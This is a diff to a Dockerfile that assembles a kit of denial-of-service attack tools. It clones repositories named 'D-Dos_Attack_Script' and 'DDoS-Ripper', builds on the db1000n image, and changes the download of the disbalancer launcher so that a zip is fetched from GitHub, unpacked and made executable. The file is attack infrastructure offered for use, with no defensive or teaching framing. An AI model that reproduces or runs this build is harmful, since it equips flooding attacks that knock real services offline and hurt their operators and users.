@@ -3,7 +3,7 @@ FROM ubuntu AS build
 # RUN curl -L http://archive.ubuntu.com/ubuntu
 ENV DEBIAN_FRONTEND=noninteractive
 RUN apt-get -y update 
-RUN apt-get install -y git python2 python3 php python3-pip wget
+RUN apt-get install -y git python2 python3 php python3-pip wget unzip
 RUN update-alternatives --install /usr/bin/python python /usr/bin/python3 25
 RUN update-alternatives --install /usr/bin/python python /usr/bin/python2 90
 RUN update-alternatives --auto python
@@ -17,9 +17,9 @@ RUN git clone https://github.com/Hrishikesh7665/D-Dos_Attack_Script.git
 RUN git clone https://github.com/palahsu/DDoS-Ripper.git
 # RUN git clone https://github.com/db1000n-coordinators/db1000n.git
 RUN mkdir disbalancer \
-    && cd disbalancer \
-    && wget https://github.com/disbalancer-project/main/releases/download/v0.0.4/launcher-disbalancer-go-client-linux-amd64 \
-    && touch proxies.txt \
+    && wget -O disbalancer.zip 'https://github.com/disbalancer-project/main/blob/main/launcher-disbalancer-docker-x64.zip?raw=true' \
+    && unzip disbalancer.zip \
+    && mv */bin/* . \
     && chmod +x launcher-disbalancer-go-client-linux-amd64
 
 FROM ghcr.io/arriven/db1000n:latest as db1000n
